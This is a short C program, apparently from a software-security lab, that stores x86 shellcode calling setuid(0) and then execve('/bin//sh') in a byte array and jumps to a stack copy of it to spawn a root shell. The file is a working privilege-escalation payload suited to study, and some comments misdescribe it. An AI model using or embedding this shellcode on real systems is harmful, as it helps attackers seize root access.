/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[] =  
    "\x31\xc0"    /* Line 1: xori   %eax,%eax  */  
    "\x31\xdb"    /* Line 2: xori   %ebx,%ebx  */  
    "\xb0\xd5"    /* Line 3: movb   $0xd5,%al  */  
    "\xcd\x80"    /* Line 4: int   $0x80  */  
    // --- The code below is the same as the one in Task 2 ---  
    "\x31\xc0"  
    "\x50"  
    "\x68""//sh"  
    "\x68""/bin"  
    "\x89\xe3"  
    "\x50"  
    "\x53"  
    "\x89\xe1"  
    "\x99"  
    "\xb0\x0b"  
    "\xcd\x80";

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
